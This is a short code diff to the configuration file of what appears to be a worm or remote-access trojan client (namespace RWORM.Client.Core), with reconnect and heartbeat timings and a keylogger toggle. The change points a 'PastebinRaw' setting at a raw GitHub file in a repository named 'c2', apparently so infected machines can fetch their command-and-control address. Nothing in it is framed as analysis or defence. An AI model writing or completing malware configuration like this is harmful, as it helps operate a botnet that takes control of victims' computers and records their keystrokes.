@@ -12,7 +12,7 @@ namespace RWORM.Client.Core
         public static int    ReconnectDelay  = 5000;
         public static int    ConnectTimeout  = 8000;
         public static int    HeartbeatInterval = 30000;
-        public static string PastebinRaw     = "";
+        public static string PastebinRaw     = "https://raw.githubusercontent.com/anthonyjosemark/c2/refs/heads/main/rayzer/p1.txt";
 
         // ── Keylogger ─────────────────────────────────────────────────────────
         public static bool   KeyloggerEnabled = false;
